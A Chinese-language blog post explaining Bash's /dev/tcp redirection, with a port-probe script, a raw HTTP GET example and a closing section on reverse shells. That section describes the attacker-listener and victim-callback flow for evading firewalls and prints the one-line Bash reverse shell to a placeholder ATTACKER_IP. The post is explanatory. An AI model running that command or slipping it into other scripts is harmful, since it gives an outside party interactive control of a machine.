---
author: Paul
pubDate: 2025-06-24
tags:
  - Linux
title: "Bash shell magic: /dev/tcp/..."
---

> Bash 将  `/dev/tcp/主机/端口`  解释为特殊重定向，打开时自动建立 TCP socket 连接，读写操作相当于在该连接上传输数据。[](https://stackoverflow.com/questions/76899269/can-someone-explain-how-does-this-command-works-bash-i-dev-tcp-ip-port)​
>
> 此功能从 Bash 2.04 版本开始支持，仅在 Bash 中有效，其他 shell 如 Zsh 不支持。​

在 Linux/Unix 的世界里，"一切皆文件" (Everything is a file)。这个哲学思想意味着你可以用相同的命令和操作（如 `cat`, `echo`, `read`, 重定向 `<` 和 `>`) 来处理不同类型的 I/O，无论是真正的文件、硬件设备还是进程。

`/dev/tcp/...` 这个特性正是这种思想的延伸。这样，就可以用最基础的 Shell 命令来实现网络通信，而**无需调用外部程序**，如 `netcat (nc)`、`telnet` 或 `curl`。这个功能的核心是**重定向 (Redirection)**。

## 端口扫描/探测

```bash
# 尝试连接到 www.google.com 的 80 端口
(echo > /dev/tcp/www.google.com/80) &>/dev/null
```

dev_tcp_scan.sh

```bash
#!/bin/bash

HOST="www.baidu.com"
PORT="80"

echo "正在检查主机 $HOST 的端口 $PORT..."

# 超时设置（可选，但推荐）
timeout 1 bash -c "(echo > /dev/tcp/$HOST/$PORT) &>/dev/null"

if [ $? -eq 0 ]; then
    echo "成功：端口 $PORT 是开放的。"
else
    echo "失败：端口 $PORT 是关闭的或主机不可达。"
fi
```

![](attachments/-20260104.png)

## HTTP 请求

```bash
#!/bin/bash

# 使用 exec 将文件描述符3与一个到 a.cn 的80端口的TCP连接关联
# <> 表示可读可写
exec 3<>/dev/tcp/cn.bing.com/80

# 通过文件描述符3发送一个 HTTP GET 请求
# -e 让 echo 能够解析 \n 换行符
echo -e "GET / HTTP/1.1\nHost: cn.bing.com\n\n" >&3

# 从文件描述符3读取并打印服务器的响应
cat <&3

# 关闭文件描述符
exec 3<&-
```

## Reverse Shell

- [反向 shell 备忘单|Reverse Shell Cheat Sheet - 🔰 雨苁 ℒ🔰](https://www.ddosi.org/reverse-shell/#Bash%E5%8F%8D%E5%90%91Shell)

为了绕过防火墙的限制，反向 Shell 应运而生。它把连接的方向完全颠倒了过来。

1. **攻击者机器 (服务器端)**：在自己的公网服务器上运行一个程序，监听在某个端口上（比如 `4444`），等待“猎物”上钩。
2. **受害者机器 (客户端)**：主动执行一个命令，**从内部发起连接**，去连接攻击者机器的 `IP:4444`。
3. 一旦连接成功，受害者机器就把本地的 Shell（`/bin/bash`）的输入输出，全部交给了这个主动建立的连接。

```bash
# -i 交互式
# >& 重定向，stdout stderr定向到/dev/tcp/ATTACKER_IP/PORT
# 0>&1 stdin定向到/dev/tcp/ATTACKER_IP/PORT中
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
```
